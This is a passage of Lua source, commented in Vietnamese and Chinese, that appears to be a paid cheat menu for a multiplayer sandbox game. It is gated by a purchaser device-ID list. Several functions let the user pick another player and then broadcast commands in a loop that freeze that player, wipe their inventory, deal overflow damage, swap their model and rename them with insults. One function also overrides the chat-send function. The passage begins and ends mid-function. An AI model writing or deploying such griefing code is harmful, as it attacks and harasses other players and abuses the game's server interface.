                            -- Khôi phục di chuyển cho đối thủ
                            local restoreMove = { "player", "changPlayerMoveType", {selectedUin, 1} }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, restoreMove)
                        end

                        ShowGameTipsWithoutFilter("#c00ffffĐã TẮT thực thi thành công!")
                        _G.dffz_thread = nil
                    end)

                end, "选择要作用的目标")
            end
        end
    )
end

function pctn5()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#RĐã kích hoạt thành công")
    
    -- Đóng giao diện tự động
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    -- Chỉ sử dụng MỘT HỘP THOẠI DUY NHẤT (Yes/No)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "⚠️ Cảnh báo ⚠️\nChế độ Null Void có thể Gây Lag!\nDừng lại ở bên trái\nBắt đầu từ bên phải",
        "Dừng",
        "Bắt đầu",
        function(userData, btnType)
            if btnType == 0 then
                -- DỪNG: Tắt tác động, giữ chữ VÀ KHÔI PHỤC SKY VỀ {0, 10, 1}
                _G.dffz_enabled = false
                _G.rainbow_name_enabled = false

                local resetSkyData = {
                    [1] = "world",
                    [2] = "SetSkyBoxFilter",
                    [3] = {0, 10, 1}
                }
                pcall(function()
                    if ScriptSupportTask and SSTASKID then
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, resetSkyData)
                    end
                end)

                ShowGameTipsWithoutFilter("#cFF0000Đã dừng tác động, khôi phục Sky về {0, 10, 1} & giữ nguyên chữ trên đầu kẻ thù!")
                
            elseif btnType == 1 then
                -- BẮT ĐẦU: 1. Kích hoạt hiệu ứng cầu vồng và chat tự động cho bản thân
                if CurMainPlayer then
                    local originalName = nil
                    pcall(function()
                        if CurMainPlayer.getName then
                            originalName = CurMainPlayer:getName()
                        elseif CurMainPlayer.getNickname then
                            originalName = CurMainPlayer:getNickname()
                        end
                    end)

                    if not originalName or originalName == "" then
                        local selfUin = AccountManager and AccountManager.getUin and AccountManager:getUin() or 0
                        if GameVM and GameVM.Player then
                            _, originalName = GameVM.Player:getNickname(selfUin)
                        end
                    end

                    if originalName and originalName ~= "" then
                        _G.current_rainbow_nickname = originalName

                        -- Hook chat tự động
                        local function SendSelfChat(Text)
                            local selfUin = AccountManager and AccountManager.getUin and AccountManager:getUin() or 0
                            if selfUin <= 1000 then return end
                            
                            Text = tostring(Text or "")
                            Text = string.gsub(Text, "[\r\n]", "")
                            if Text == "" then return end
                            
                            local playerName = _G.current_rainbow_nickname or originalName
                            playerName = string.gsub(playerName, "[\r\n]", "")
                            
                            if not ScriptSupportTask or not ScriptSupportTask.reportTaskToHost or not SSTASKID then return end
                            local tdata = {
                                [1] = "chat",
                                [2] = "sendChat",
                                [3] = { "#L" .. playerName .. "#n：#cffffff" .. Text, 1, 0 }
                            }
                            pcall(function() ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) end)
                        end

                        if ClientCurGame and ClientCurGame.sendChat and not _G._IsSendChatHooked then
                            ClientCurGame.sendChat = function(self, ...)
                                local args = {...}
                                local Text = tostring(args[1] or "")
                                SendSelfChat(Text)
                            end
                            _G._IsSendChatHooked = true
                        end

                        -- Hiệu ứng cầu vồng cho tên
                        _G.rainbow_name_generation = (_G.rainbow_name_generation or 0) + 1
                        local currentGeneration = _G.rainbow_name_generation
                        _G.rainbow_name_enabled = true
                        local TARGET_UID = AccountManager:getUin()

                        local function splitUtf8(str)
                            local characters = {}
                            for character in string.gmatch(str, "[%z\1-\127\194-\244][\128-\191]*") do
                                table.insert(characters, character)
                            end
                            return characters
                        end

                        local function hsvToRgb(hue, saturation, value)
                            local sector = math.floor(hue * 6)
                            local fraction = hue * 6 - sector
                            local p = value * (1 - saturation)
                            local q = value * (1 - fraction * saturation)
                            local t = value * (1 - (1 - fraction) * saturation)
                            sector = sector % 6
                            local red, green, blue
                            if sector == 0 then red, green, blue = value, t, p
                            elseif sector == 1 then red, green, blue = q, value, p
                            elseif sector == 2 then red, green, blue = p, value, t
                            elseif sector == 3 then red, green, blue = p, q, value
                            elseif sector == 4 then red, green, blue = t, p, value
                            else red, green, blue = value, p, q
                            end
                            return math.floor(red * 255 + 0.5), math.floor(green * 255 + 0.5), math.floor(blue * 255 + 0.5)
                        end

                        local function rgbToHex(red, green, blue)
                            return string.format("%02x%02x%02x", red, green, blue)
                        end

                        local function createSmoothRainbow(str, baseHue)
                            local characters = splitUtf8(str)
                            local result = {}
                            local letterIndex = 0
                            for _, character in ipairs(characters) do
                                if character == " " or character == "\n" then
                                    table.insert(result, character)
                                else
                                    local hue = (baseHue + letterIndex * 0.08) % 1
                                    local red, green, blue = hsvToRgb(hue, 1, 1)
                                    table.insert(result, "#c" .. rgbToHex(red, green, blue) .. character)
                                    letterIndex = letterIndex + 1
                                end
                            end
                            return table.concat(result)
                        end

                        threadpool:work(function()
                            local baseHue = 0
                            while _G.rainbow_name_enabled and currentGeneration == _G.rainbow_name_generation do
                                local rainbowNickname = createSmoothRainbow(originalName, baseHue)
                                _G.current_rainbow_nickname = rainbowNickname
                                local tdata = { [1] = "actor", [2] = "setnickname", [3] = { TARGET_UID, rainbowNickname } }
                                pcall(function()
                                    if ScriptSupportTask and SSTASKID then
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                    end
                                end)
                                baseHue = (baseHue + 0.02) % 1
                                threadpool:wait(0.05)
                            end
                            _G.current_rainbow_nickname = originalName
                            local resetData = { [1] = "actor", [2] = "setnickname", [3] = { TARGET_UID, originalName } }
                            pcall(function()
                                if ScriptSupportTask and SSTASKID then
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, resetData)
                                end
                            end)
                        end)
                    end
                end

                -- 2. Mở bảng chọn người chơi để chạy tác động mục tiêu & CHUYỂN SKY SANG {0, 6, 1}
                _G.dffz_enabled = false
                _G.custom_title_enabled = false
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                threadpool:wait(0.1)
                _G.dffz_enabled = true
                _G.custom_title_enabled = true
                
                -- Gửi lệnh đổi Sky thành {0, 6, 1} khi bắt đầu tấn công
                local attackSkyData = {
                    [1] = "world",
                    [2] = "SetSkyBoxFilter",
                    [3] = {0, 6, 1}
                }
                pcall(function()
                    if ScriptSupportTask and SSTASKID then
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, attackSkyData)
                    end
                end)

                ShowPlayerList(function(selectedUin)
                    if not selectedUin then
                        _G.dffz_enabled = false
                        _G.custom_title_enabled = false
                        ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
                        return
                    end

                    local isWhitelisted = false
                    if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                        isWhitelisted = true
                    end

                    if isWhitelisted then
                        _G.dffz_enabled = false
                        _G.custom_title_enabled = false
                        ShowGameTipsWithoutFilter("#RNgười này nằm trong danh sách trắng toàn cục (Whitelist)!")
                        return
                    end

                    local myUin = nil
                    if AccountManager and AccountManager.getUin then
                        pcall(function()
                            myUin = AccountManager:getUin()
                        end)
                    end

                    if selectedUin == myUin then
                        _G.dffz_enabled = false
                        _G.custom_title_enabled = false
                        ShowGameTipsWithoutFilter("#RKhông thể áp dụng lên chính mình!")
                        return
                    end

                    -- Cấu hình hiển thị chữ trên đầu kẻ thù
                    _G.custom_title_generation = (_G.custom_title_generation or 0) + 1
                    local currentTitleGen = _G.custom_title_generation
                    local customTitle = "#b#R死人（本不应该活着！）"

                    local dir = { x = 0, y = 20, z = 0 }
                    local textOffset = 10
                    local textX2, textY2 = 0, 0

                    local graphicsInfo = {
                        apha = 1,
                        Type = 1,
                        title = customTitle,
                        autoWrap = 2,
                        itype = 1,
                        fontsize = 100
                    }

                    local tdataText = {
                        [1] = "graphics",
                        [2] = "createGraphicsTxtByActor",
                        [3] = {
                            selectedUin,
                            graphicsInfo,
                            dir,
                            textOffset,
                            textX2,
                            textY2
                        }
                    }

                    -- Luồng hiển thị chữ trên đầu kẻ thù
                    threadpool:work(function()
                        while _G.custom_title_enabled and currentTitleGen == _G.custom_title_generation do
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdataText)
                            end)
                            threadpool:wait(1)
                        end
                    end)

                    -- Luồng thực thi tác động mục tiêu & Hiệu ứng cơ thể
                    _G.dffz_thread = threadpool:work(function()
                        ShowGameTipsWithoutFilter("#c00ffffĐã BẬT thực thi!")

                        while _G.dffz_enabled do
                            xpcall(function()
                                if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                                    _G.dffz_enabled = false
                                    return
                                end

                                local targetUin = selectedUin
                                if targetUin and targetUin ~= myUin then
                                    local tdata = { "player", "changPlayerMoveType", {targetUin, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 797} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 798} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "changeCustomModel", {targetUin, "mob_3603"} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "backpack", "clearAllPack", {targetUin} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {targetUin, 1, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 64, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 128, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "playerHurt", {myUin, targetUin, 1.8e+308, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setAtt", {targetUin, 1, 2} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "setnickname", {targetUin, "#b#KIdi#b#Rot"} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    -- Hiệu ứng trên cơ thể kẻ thù
                                    tdata = { "actor", "playBodyEffectByFile", {targetUin, "aotu_06_leishenzhichui", true} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "playBodyEffectByFile", {targetUin, "12834", true} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "playBodyEffectByFile", {targetUin, "bossskill_lasertailblue", true} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "playBodyEffectByFile", {targetUin, "jiguang01", true} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                end
                            end, function(err)
                                print("Lỗi vòng lặp: " .. tostring(err))
                            end)

                            threadpool:wait(0.00000001) 
                        end

                        if selectedUin and selectedUin ~= myUin then
                            local restoreMove = { "player", "changPlayerMoveType", {selectedUin, 1} }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, restoreMove)
                        end

                        ShowGameTipsWithoutFilter("#c00ffffĐã TẮT thực thi thành công!")
                        _G.dffz_thread = nil
                    end)

                end, "选择要作用的目标")
            end
        end
    )
end

function pctn6()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#R开启成功")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "Dừng",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.dffz_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000已停止")
                
            elseif btnType == 1 then
                _G.dffz_enabled = false
                
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                threadpool:wait(0.1)
                
                _G.dffz_enabled = true
                
                -- ========================================================
                -- GỌI BẢNG CHỌN NGƯỜI CHƠI (SHOWPLAYERLIST)
                -- ========================================================
                ShowPlayerList(function(selectedUin)
                    if not selectedUin then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
                        return
                    end

                    -- KIỂM TRA NẾU NGƯỜI ĐƯỢC CHỌN NẰM TRONG WHITELIST
                    if whitelist and whitelist[selectedUin] then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RNgười này nằm trong danh sách trắng (Whitelist)!")
                        return
                    end

                    -- ========================================================
                    -- CẤU HÌNH CẦU VỒNG CHO BẢN THÂN
                    -- ========================================================
                    local ENABLE_MYSELF = true

                    -- Lấy UID của bản thân
                    local myUin = nil
                    if AccountManager and AccountManager.getUin then
                        pcall(function()
                            myUin = AccountManager:getUin()
                        end)
                    end

                    -- Lấy Tên gốc của bản thân để khôi phục khi tắt
                    local myOriginalName = nil
                    if AccountManager then
                        pcall(function()
                            pcall(function()
                                if AccountManager.getNickName then
                                    myOriginalName = AccountManager:getNickName()
                                elseif AccountManager.getName then
                                    myOriginalName = AccountManager:getName()
                                end
                            end)
                        end)
                    end

                    -- Hàm tách ký tự UTF-8
                    local function splitUtf8(text)
                        local characters = {}
                        for character in string.gmatch(text, "[%z\1-\127\194-\244][\128-\191]*") do
                            table.insert(characters, character)
                        end
                        return characters
                    end

                    -- Chuyển HSV sang RGB
                    local function hsvToRgb(hue, saturation, value)
                        local sector = math.floor(hue * 6)
                        local fraction = hue * 6 - sector

                        local p = value * (1 - saturation)
                        local q = value * (1 - fraction * saturation)
                        local t = value * (1 - (1 - fraction) * saturation)

                        sector = sector % 6

                        local red, green, blue
                        if sector == 0 then red, green, blue = value, t, p
                        elseif sector == 1 then red, green, blue = q, value, p
                        elseif sector == 2 then red, green, blue = p, value, t
                        elseif sector == 3 then red, green, blue = p, q, value
                        elseif sector == 4 then red, green, blue = t, p, value
                        else red, green, blue = value, p, q
                        end

                        return math.floor(red * 255 + 0.5),
                               math.floor(green * 255 + 0.5),
                               math.floor(blue * 255 + 0.5)
                    end

                    -- Chuyển RGB sang Hex dạng RRGGBB
                    local function rgbToHex(red, green, blue)
                        return string.format("%02x%02x%02x", red, green, blue)
                    end

                    -- Tạo tên có hiệu ứng cầu vồng
                    local function createSmoothRainbow(text, baseHue)
                        local characters = splitUtf8(text)
                        local result = {}
                        local letterIndex = 0

                        for _, character in ipairs(characters) do
                            if character == " " or character == "\n" then
                                table.insert(result, character)
                            else
                                local hue = (baseHue + letterIndex * 0.08) % 1
                                local red, green, blue = hsvToRgb(hue, 1, 1)

                                table.insert(result, "#c" .. rgbToHex(red, green, blue) .. character)
                                letterIndex = letterIndex + 1
                            end
                        end

                        return table.concat(result)
                    end

                    -- Hàm gửi lệnh đổi tên lên máy chủ
                    local function sendSetNickname(uid, nickname)
                        if not uid then return end
                        local tdata = {
                            [1] = "actor",
                            [2] = "setnickname",
                            [3] = {
                                uid,
                                nickname
                            }
                        }
                        pcall(function()
                            if ScriptSupportTask and SSTASKID then
                                ScriptSupportTask:reportTaskToHost(
                                    SSTASKID.HOST_BordCast,
                                    tdata
                                )
                            end
                        end)
                    end

                    -- ========================================================
                    -- MỞ LUỒNG CHẠY CHÍNH
                    -- ========================================================
                    _G.dffz_thread = threadpool:work(function()
                        ShowGameTipsWithoutFilter("#c00ffffĐã BẬT thực thi!")

                        local baseHue = 0

                        while _G.dffz_enabled do
                            xpcall(function()
                                -- 1. Đổi tên cầu vồng liên tục cho bản thân
                                if ENABLE_MYSELF and myUin and myOriginalName then
                                    local myRainbowName = createSmoothRainbow(myOriginalName, baseHue)
                                    sendSetNickname(myUin, myRainbowName)
                                    baseHue = (baseHue + 0.02) % 1
                                end

                                -- 2. Tác động trực tiếp vào mục tiêu bạn đã chọn từ bảng
                                local targetUin = selectedUin
                                if targetUin and targetUin ~= myUin and not (whitelist and whitelist[targetUin]) then
                                    local tdata = { "player", "changPlayerMoveType", {targetUin, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 797} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 798} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "changeCustomModel", {targetUin, "role_11"} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "notifyGameInfo2Self", {targetUin, "#cFFFFAA王#cEEFFAA权#cDDFFAA执#cCCFFAA掌#cBBFFAA生#cAAFFAA死"} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "backpack", "clearAllPack", {targetUin} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {targetUin, 1, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 64, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 128, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "playerHurt", {myUin, targetUin, 1.8e+308, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setAtt", {targetUin, 1, 2} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                end
                            end, function(err)
                                print("Lỗi vòng lặp: " .. tostring(err))
                            end)

                            threadpool:wait(0.01) 
                        end

                        -- ========================================================
                        -- KHI DỪNG SCRIPT: KHÔI PHỤC TRẠNG THÁI CHO MỤC TIÊU & BẢN THÂN
                        -- ========================================================
                        if selectedUin and selectedUin ~= myUin then
                            local restoreMove = { "player", "changPlayerMoveType", {selectedUin, 1} }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, restoreMove)
                        end

                        if myUin and myOriginalName then
                            sendSetNickname(myUin, myOriginalName)
                        end

                        ShowGameTipsWithoutFilter("#c00ffffĐã TẮT thực thi thành công!")
                        _G.dffz_thread = nil
                    end)

                end, "选择要作用的目标")
            end
        end
    )
end

function pctn8()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#R开启成功")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "Dừng",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.dffz_enabled = false
                ShowGameTipsWithoutFilter("#cFF0000已停止")
                
            elseif btnType == 1 then
                _G.dffz_enabled = false
                
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                threadpool:wait(0.1)
                
                _G.dffz_enabled = true
                
                -- ========================================================
                -- GỌI BẢNG CHỌN NGƯỜI CHƠI (SHOWPLAYERLIST)
                -- ========================================================
                ShowPlayerList(function(selectedUin)
                    if not selectedUin then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
                        return
                    end

                    -- ========================================================
                    -- KIỂM TRA DANH SÁCH TRẮNG TOÀN CỤC (GLOBAL WHITELIST)
                    -- ========================================================
                    local isWhitelisted = false
                    if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                        isWhitelisted = true
                    end

                    if isWhitelisted then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RNgười này nằm trong danh sách trắng toàn cục (Whitelist)!")
                        return
                    end

                    -- ========================================================
                    -- CẤU HÌNH CẦU VỒNG CHO BẢN THÂN VÀ ĐỐI THỦ
                    -- ========================================================
                    local ENABLE_MYSELF = true
                    local TARGET_CUSTOM_TEXT = "Văn bản định sẵn của bạn" -- Tên định sẵn cho đối thủ

                    -- Lấy UID của bản thân
                    local myUin = nil
                    if AccountManager and AccountManager.getUin then
                        pcall(function()
                            myUin = AccountManager:getUin()
                        end)
                    end

                    -- Lấy Tên gốc của bản thân để khôi phục khi tắt
                    local myOriginalName = nil
                    if AccountManager then
                        pcall(function()
                            pcall(function()
                                if AccountManager.getNickName then
                                    myOriginalName = AccountManager:getNickName()
                                elseif AccountManager.getName then
                                    myOriginalName = AccountManager:getName()
                                end
                            end)
                        end)
                    end

                    -- Lấy Tên gốc của đối thủ để khôi phục sau khi dừng / hạ gục
                    local targetOriginalName = nil
                    pcall(function()
                        if GamePlayerManager and GamePlayerManager.GetPlayerByUin then
                            local targetPlayer = GamePlayerManager:GetPlayerByUin(selectedUin)
                            if targetPlayer then
                                if targetPlayer.getNickName then
                                    targetOriginalName = targetPlayer:getNickName()
                                elseif targetPlayer.getName then
                                    targetOriginalName = targetPlayer:getName()
                                end
                            end
                        end
                    end)

                    -- Hàm tách ký tự UTF-8
                    local function splitUtf8(text)
                        local characters = {}
                        for character in string.gmatch(text, "[%z\1-\127\194-\244][\128-\191]*") do
                            table.insert(characters, character)
                        end
                        return characters
                    end

                    -- Chuyển HSV sang RGB
                    local function hsvToRgb(hue, saturation, value)
                        local sector = math.floor(hue * 6)
                        local fraction = hue * 6 - sector

                        local p = value * (1 - saturation)
                        local q = value * (1 - fraction * saturation)
                        local t = value * (1 - (1 - fraction) * saturation)

                        sector = sector % 6

                        local red, green, blue
                        if sector == 0 then red, green, blue = value, t, p
                        elseif sector == 1 then red, green, blue = q, value, p
                        elseif sector == 2 then red, green, blue = p, value, t
                        elseif sector == 3 then red, green, blue = p, q, value
                        elseif sector == 4 then red, green, blue = t, p, value
                        else red, green, blue = value, p, q
                        end

                        return math.floor(red * 255 + 0.5),
                               math.floor(green * 255 + 0.5),
                               math.floor(blue * 255 + 0.5)
                    end

                    -- Chuyển RGB sang Hex dạng RRGGBB
                    local function rgbToHex(red, green, blue)
                        return string.format("%02x%02x%02x", red, green, blue)
                    end

                    -- Tạo tên có hiệu ứng cầu vồng
                    local function createSmoothRainbow(text, baseHue)
                        local characters = splitUtf8(text)
                        local result = {}
                        local letterIndex = 0

                        for _, character in ipairs(characters) do
                            if character == " " or character == "\n" then
                                table.insert(result, character)
                            else
                                local hue = (baseHue + letterIndex * 0.08) % 1
                                local red, green, blue = hsvToRgb(hue, 1, 1)

                                table.insert(result, "#c" .. rgbToHex(red, green, blue) .. character)
                                letterIndex = letterIndex + 1
                            end
                        end

                        return table.concat(result)
                    end

                    -- Hàm gửi lệnh đổi tên lên máy chủ
                    local function sendSetNickname(uid, nickname)
                        if not uid then return end
                        local tdata = {
                            [1] = "actor",
                            [2] = "setnickname",
                            [3] = {
                                uid,
                                nickname
                            }
                        }
                        pcall(function()
                            if ScriptSupportTask and SSTASKID then
                                ScriptSupportTask:reportTaskToHost(
                                    SSTASKID.HOST_BordCast,
                                    tdata
                                )
                            end
                        end)
                    end

                    -- ========================================================
                    -- MỞ LUỒNG CHẠY CHÍNH
                    -- ========================================================
                    _G.dffz_thread = threadpool:work(function()
                        ShowGameTipsWithoutFilter("#c00ffffĐã BẬT thực thi!")

                        local baseHue = 0
                        local targetBaseHue = 0

                        while _G.dffz_enabled do
                            xpcall(function()
                                -- Kiểm tra lại danh sách trắng toàn cục liên tục trong lúc chạy phòng hờ thay đổi
                                if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                                    _G.dffz_enabled = false
                                    return
                                end

                                -- 1. Đổi tên cầu vồng liên tục cho bản thân
                                if ENABLE_MYSELF and myUin and myOriginalName then
                                    local myRainbowName = createSmoothRainbow(myOriginalName, baseHue)
                                    sendSetNickname(myUin, myRainbowName)
                                    baseHue = (baseHue + 0.02) % 1
                                end

                                -- 2. Đổi tên đối thủ thành văn bản định sẵn có hiệu ứng cầu vồng liên tục
                                local targetUin = selectedUin
                                if targetUin and targetUin ~= myUin then
                                    local targetRainbowText = createSmoothRainbow(TARGET_CUSTOM_TEXT, targetBaseHue)
                                    sendSetNickname(targetUin, targetRainbowText)
                                    targetBaseHue = (targetBaseHue + 0.02) % 1

                                    -- Các tác động khác giữ nguyên
                                    local tdata = { "player", "changPlayerMoveType", {targetUin, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 797} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 798} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "changeCustomModel", {targetUin, "role_11"} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "backpack", "clearAllPack", {targetUin} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {targetUin, 1, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 64, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 128, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "playerHurt", {myUin, targetUin, 1.8e+308, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setAtt", {targetUin, 1, 2} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                end
                            end, function(err)
                                print("Lỗi vòng lặp: " .. tostring(err))
                            end)

                            threadpool:wait(0.01) 
                        end

                        -- ========================================================
                        -- KHI DỪNG SCRIPT: KHÔI PHỤC TRẠNG THÁI CHO MỤC TIÊU & BẢN THÂN
                        -- ========================================================
                        if selectedUin and selectedUin ~= myUin then
                            -- Khôi phục di chuyển cho đối thủ
                            local restoreMove = { "player", "changPlayerMoveType", {selectedUin, 1} }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, restoreMove)

                            -- Khôi phục tên gốc cho đối thủ
                            if targetOriginalName then
                                sendSetNickname(selectedUin, targetOriginalName)
                            end
                        end

                        -- Khôi phục tên gốc cho bản thân
                        if myUin and myOriginalName then
                            sendSetNickname(myUin, myOriginalName)
                        end

                        ShowGameTipsWithoutFilter("#c00ffffĐã TẮT thực thi thành công!")
                        _G.dffz_thread = nil
                    end)

                end, "选择要作用的目标")
            end
        end
    )
end

function pctn7()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#RĐã kích hoạt thành công")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "关闭",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.dffz_enabled = false

                -- ========================================================
                -- THÊM LỆNH KHÔI PHỤC SETSKYBOXTEMPLATE KHI BẤM DỪNG
                -- ========================================================
                local resetSkyTemplate = {
                    [1] = "world",
                    [2] = "SetSkyBoxTemplate",
                    [3] = {1}
                }
                pcall(function()
                    if ScriptSupportTask and SSTASKID then
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, resetSkyTemplate)
                    end
                end)
                -- ========================================================

                ShowGameTipsWithoutFilter("#cFF0000已停止 & Đã khôi phục SetSkyBoxTemplate(1)")
                
            elseif btnType == 1 then
                _G.dffz_enabled = false
                
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                threadpool:wait(0.1)
                
                _G.dffz_enabled = true
                
                -- ========================================================
                -- GỌI BẢNG CHỌN NGƯỜI CHƠI (SHOWPLAYERLIST)
                -- ========================================================
                ShowPlayerList(function(selectedUin)
                    if not selectedUin then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
                        return
                    end

